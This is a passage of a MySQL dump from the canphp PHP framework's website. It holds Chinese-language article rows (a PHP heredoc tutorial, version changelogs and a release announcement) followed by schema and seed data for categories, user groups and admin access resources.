--display :&lt;span style=&quot;color:#cc66cc;&quot;&gt;1&lt;/span&gt; http://www.google.com google_com.png&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;br /&gt;\r\n&lt;p&gt;每行一条，如有必要可以适当的sleep一下。需要采集截图时，执行如下指令即可&lt;/p&gt;\r\nsh sitelist', 1, 1, 0, 0, 1310310325, 1, 'admin'),
(125, 1, 'PHP原型文档(heredoc)&lt;&lt;&lt;EOT使用讲解', '', '', '&lt;p&gt;Heredoc技术，在正规的PHP文档中和技术书籍中一般没有详细讲述，只是提到了这是一种Perl风格的字符串输出技术。但是现在的一些论坛程序，和部分文章系统，都巧妙的使用heredoc技术，来部分的实现了界面与代码的准分离，phpwind模板就是一个典型的例子。&lt;/p&gt;\r\n&lt;p&gt;如下：&lt;/p&gt;\r\n&lt;div style=&quot;color:#000000;font-family:''consolas'',''lucida console'',''courier new'';background-color:#f9f7ed;&quot;&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#000000;&quot;&gt;$name&lt;/span&gt; &lt;span style=&quot;color:#000000;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;''浅水游''&lt;/span&gt;;&lt;br /&gt;\r\n&lt;span style=&quot;color:#0000ff;&quot;&gt;print&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;&amp;lt;&amp;lt;EOT&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;metahttp-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;/&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;title&amp;gt;UntitledDocument&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;!--12321--&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;Hello,$name!&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span style=&quot;color:#a31515;&quot;&gt;EOT;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#0000ff;&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;/div&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n1.以&lt;strong&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;lt;&amp;lt;&amp;lt;End&lt;/span&gt;&lt;/strong&gt;开始标记开始，以&lt;span style=&quot;color:#0000ff;&quot;&gt;End&lt;/span&gt;结束标记结束，&lt;strong&gt;&lt;span style=&quot;color:#ff0000;&quot;&gt;结束标记必须顶头写，不能有缩进和空格，&lt;/span&gt;且在结束标记末尾要有分号&lt;/strong&gt;。开始标记和开始标记相同，比如常用大写的EOT、EOD、EOF来表示，但是不只限于那几个，只要保证&lt;strong&gt;开始标记和结束标记不在正文中出现即可&lt;/strong&gt;。&lt;/p&gt;\r\n&lt;p&gt;2.位于开始标记和结束标记之间的变量可以被正常解析，&lt;strong&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;但是函数则不可以&lt;/span&gt;&lt;/strong&gt;。在heredoc中，变量不需要用连接符.或,来拼接，如下：&lt;/p&gt;\r\n&lt;p&gt;$v=2;&lt;br /&gt;\r\n$a= &amp;lt;&amp;lt;&amp;lt;EOF&lt;br /&gt;\r\n&quot;abc&quot;&lt;strong&gt;$v&lt;br /&gt;\r\n&lt;/strong&gt;&quot;123&quot;&lt;br /&gt;\r\nEOF;&lt;br /&gt;\r\necho $a; //结果连同双引号一起输出：&quot;abc&quot;2 &quot;123&quot;&lt;/p&gt;\r\n&lt;p&gt;3.heredoc常用在输出包含大量HTML语法d文档的时候。比如：函数outputhtml()要输出HTML的主页。可以有两种写法。很明显第二种写法比较简单和易于阅读。&lt;/p&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;01&lt;/span&gt;&lt;span style=&quot;color:#0000ff;&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;02&lt;/span&gt; &lt;span style=&quot;color:#0000ff;&quot;&gt;function&lt;/span&gt; &lt;span style=&quot;color:#000000;&quot;&gt;outputhtml&lt;/span&gt;&lt;span style=&quot;color:#000000;&quot;&gt;(){&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;03&lt;/span&gt; &lt;span style=&quot;color:#0000ff;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&quot;&amp;lt;html&amp;gt;&quot;&lt;/span&gt;;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;04&lt;/span&gt; &lt;span style=&quot;color:#0000ff;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&quot;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;主页&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&quot;&lt;/span&gt;;&lt;br /&gt;\r\n&lt;span style=&quot;color:#f810b0;&quot;&gt;05&lt;/span&gt; &lt;span style=&quot;color:#0000ff;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&quot;&amp;lt;body&amp;gt;主页内容&amp;lt;/body&amp;gt;&quot;&lt;/span&gt;;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;06&lt;/span&gt; &lt;span style=&quot;color:#0000ff;&quot;&gt;echo&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&quot;&amp;lt;/html&amp;gt;;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;07&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;}&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;08&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;09&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;function outputhtml()&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#f810b0;&quot;&gt;10&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;{&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;11&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;echo&amp;lt;&amp;lt;&amp;lt;EOT&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;12&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;13&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;主页&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;14&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&amp;lt;body&amp;gt;主页内容&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#f810b0;&quot;&gt;15&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;&amp;nbsp;&lt;wbr&gt;&amp;nbsp;&lt;wbr&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;16&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;EOT;&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;17&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;}&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;18&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#008000;&quot;&gt;19&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;outputhtml();&lt;/span&gt;&lt;br /&gt;\r\n&lt;span style=&quot;color:#f810b0;&quot;&gt;20&lt;/span&gt; &lt;span style=&quot;color:#a31515;&quot;&gt;?&amp;gt;&lt;/span&gt;', 1, 1, 0, 0, 1309341418, 1, 'admin'),
(126, 1, 'canphp框架的完整升级日志', '', '', '&lt;p&gt;2011-07-20 canphp1.4&lt;br /&gt;\r\n1、新增强大的表单验证类&lt;br /&gt;\r\n2、新增数据库备份与恢复类，支持分卷。&lt;br /&gt;\r\n3、新增zip压缩压缩与解压缩类&lt;br /&gt;\r\n4、新增汉字转拼音类&lt;br /&gt;\r\n5、新增ip地理位置信息类&lt;br /&gt;\r\n6、新增模型调用函数model()&lt;br /&gt;\r\n7、Http.class.php类http协议由1.1改成1.0，解决采用socket方式，返回的数据多了几个字符的问题。&lt;br /&gt;\r\n8、修正1.3版本中生成的缓存没有后缀的bug&lt;br /&gt;\r\n9、修正其他一些细节bug&lt;/p&gt;\r\n&lt;p&gt;2011-06-25 canphp1.3&lt;br /&gt;\r\n1 修改默认配置加载方式，默认配置写成静态类cpConfig.class.php&lt;br /&gt;\r\n2 lib目录增加插件管理控制类Plugin.class.php&lt;br /&gt;\r\n3 增加模板标签自定义解析接口tpl_parse_ext($template)，可任意diy模板标签&lt;br /&gt;\r\n4 ext目录增加extend.php扩展函数文件，默认会加载，留给用户自定义函数&lt;br /&gt;\r\n5 过滤函数文件filter.function.php合并到了common.function.php&lt;br /&gt;\r\n6 优化cpModel模型类的find()和修正insert()方法返回bug&lt;br /&gt;\r\n7 修正删除静态缓存bug&lt;br /&gt;\r\n8 常用函数库common.function.php增加del_dir()函数&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n2011-05-15 canphp1.2&lt;br /&gt;\r\n1 常用函数增加了加解密函数cp_encode()和cp_decode()&lt;br /&gt;\r\n2 升级了http类，支持发送http头，如cookie信息等&lt;br /&gt;\r\n3 升级了多语言类，增加了获取语言包数组getPack()方法&lt;br /&gt;\r\n4 改善数据库缓存类，没有调用数据库，不加载缓存类和数据缓存文件&lt;br /&gt;\r\n5 修改了一些细节bug&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n2011-04-15 canphp1.1&lt;br /&gt;\r\n1 升级了数据库缓存系统，支持数百万级数据&lt;br /&gt;\r\n2 扩展类库中增加了权限认证类&lt;br /&gt;\r\n3 错误日志类增加记录出错页面网址&lt;br /&gt;\r\n4 修正分页类一些小细节bug&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;br /&gt;\r\n2011-03-12 canphp1.0正式版&lt;br /&gt;\r\n1 增加调试和发布模式&lt;br /&gt;\r\n2 增加自定义系统错误页面重定向&lt;br /&gt;\r\n3 增加静态页面生成功能&lt;br /&gt;\r\n4 增加多语言支持&lt;br /&gt;\r\n5 增加自动包含所需的类&lt;br /&gt;\r\n6 cpApp单一入口中，增加默认加载common.function.php和filter.function.php&lt;br /&gt;\r\n7 常用函数库common.function.php增加module(),json_encode(),is_email()三个函数&lt;br /&gt;\r\n8 第三方扩展库增加邮件发送类&lt;br /&gt;\r\n9 改进分页类，支持多种样式输出&lt;br /&gt;\r\n10 改进filter.function.php的过滤函数in()和还原函数out()，参数可以是数组&lt;br /&gt;\r\n11 解决有bom头部信息导致验证码不能显示bug&lt;br /&gt;\r\n12 解决index.php?参数名=参数值形式的网址解析bug&lt;/p&gt;\r\n&lt;p&gt;从beta版本升级到正式版本&lt;br /&gt;\r\n将正式版的CanPHP目录直接覆盖掉原来的CanPHP目录&lt;br /&gt;\r\n注意，如果原来在init.php定义了module函数，则需要把它删除，因为正式版把它集成到了常用函数库中&lt;/p&gt;\r\n', 1, 1, 0, 0, 1311270760, 1, 'admin'),
(127, 1, 'canphp1.4核心+开发手册正式发布', '', '', 'cp1.4版本中增加了不少&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%8A%9F%E8%83%BD&quot;&gt;功能&lt;/span&gt;，增加的功能有：1、新增强大的表单验证类&lt;br /&gt;\r\n2、新增&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%B0%E6%8D%AE%E5%BA%93&quot;&gt;数据库&lt;/span&gt;备份与恢复类，支持分卷。&lt;br /&gt;\r\n3、新增zip压缩压缩与解压缩类&lt;br /&gt;\r\n4、新增汉字转拼音类&lt;br /&gt;\r\n5、新增ip地理位置信息类&lt;br /&gt;\r\n6、新增&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%A8%A1%E5%9E%8B&quot;&gt;模型&lt;/span&gt;调用函数model()&lt;br /&gt;\r\n&lt;br /&gt;\r\n修正的问题有：&lt;br /&gt;\r\n1、Http.class.&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=php&quot;&gt;php&lt;/span&gt;类http协议由1.1改成1.0，解决采用socket方式，返回的数据多了几个字符的问题。&lt;br /&gt;\r\n2、修正1.3版本中生成的缓存没有后缀的bug&lt;br /&gt;\r\n3、修正其他一些细节bug&lt;br /&gt;\r\n&lt;br /&gt;\r\ncp低版本升级到高版本方法，直接覆盖即可。&lt;br /&gt;\r\n&lt;br /&gt;\r\n感谢大家提供了不少优秀的源码和意见，携手努力打造更实用更好用的can&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=php%E6%A1%86%E6%9E%B6&quot;&gt;php框架&lt;/span&gt;。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80&quot;&gt;下载地址&lt;/span&gt;：&lt;a href=&quot;http://www.canphp.com/upload/canphp1.4.zip&quot; target=&quot;_blank&quot;&gt;&lt;font color=&quot;#0000ff&quot;&gt;http://www.canphp.com/upload/canphp1.4.zip&lt;/font&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n跟帖地址&lt;a href=&quot;http://www.canphp.com/bbs/thread-669-1-1.html&quot;&gt;http://www.canphp.com/bbs/thread-669-1-1.html&lt;/a&gt;&lt;br /&gt;\r\n', 1, 1, 0, 0, 1311270845, 1, 'admin');

-- --------------------------------------------------------

--
-- 表的结构 `cp_case`
--

CREATE TABLE IF NOT EXISTS `cp_case` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL,
  `intro` varchar(255) NOT NULL,
  `image` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `create_time` int(10) unsigned NOT NULL,
  `create_uid` int(10) unsigned NOT NULL,
  `create_username` varchar(20) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

--
-- 转存表中的数据 `cp_case`
--


-- --------------------------------------------------------

--
-- 表的结构 `cp_category`
--

CREATE TABLE IF NOT EXISTS `cp_category` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT '分类id',
  `pid` int(10) unsigned NOT NULL DEFAULT '0' COMMENT '上一级分类id',
  `name` varchar(100) NOT NULL COMMENT '分类名称',
  `keywords` varchar(255) DEFAULT NULL COMMENT '关键词',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章栏目分类' AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `cp_category`
--

INSERT INTO `cp_category` (`id`, `pid`, `name`, `keywords`, `description`) VALUES
(1, 0, '最新动态', NULL, NULL);

-- --------------------------------------------------------

--
-- 表的结构 `cp_group`
--

CREATE TABLE IF NOT EXISTS `cp_group` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `power_value` varchar(1000) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- 转存表中的数据 `cp_group`
--

INSERT INTO `cp_group` (`id`, `name`, `power_value`) VALUES
(1, 'admin', '-1');

-- --------------------------------------------------------

--
-- 表的结构 `cp_resource`
--

CREATE TABLE IF NOT EXISTS `cp_resource` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `pid` int(10) unsigned NOT NULL,
  `operate` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `pid` (`pid`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=37 ;

--
-- 转存表中的数据 `cp_resource`
--

INSERT INTO `cp_resource` (`id`, `pid`, `operate`, `name`) VALUES
(1, 0, 'article', ''),
(2, 1, 'index', ''),
(3, 1, 'search', ''),
(4, 1, 'add', ''),
(5, 1, 'edit', ''),
(6, 1, 'del', ''),
(7, 1, 'state', ''),
(8, 0, 'case', ''),
(9, 8, 'index', ''),
(10, 8, 'add', ''),
(11, 8, 'edit', ''),
(12, 8, 'del', ''),
(13, 0, 'category', ''),
(14, 13, 'getModules', ''),
(15, 13, 'index', ''),
(16, 13, 'add', ''),
(17, 13, 'edit', ''),
(18, 13, 'del', ''),
(19, 13, 'getCat', ''),
(20, 0, 'index', ''),
(21, 20, 'index', ''),
(22, 20, 'login', ''),
(23, 20, 'logout', ''),
(24, 20, 'verify', ''),
(25, 20, 'welcome', ''),
(26, 0, 'tpl', ''),
(27, 26, 'index', ''),
(28, 26, 'edit', ''),
(29, 26, 'restore', ''),
(30, 20, 'isPost', ''),
(31, 1, 'isPost', ''),
(32, 8, 'isPost', ''),
(33, 13, 'isPost', ''),
(34, 0, 'common', ''),
(35, 34, 'isPost', ''),
(36, 26, 'isPost', '');
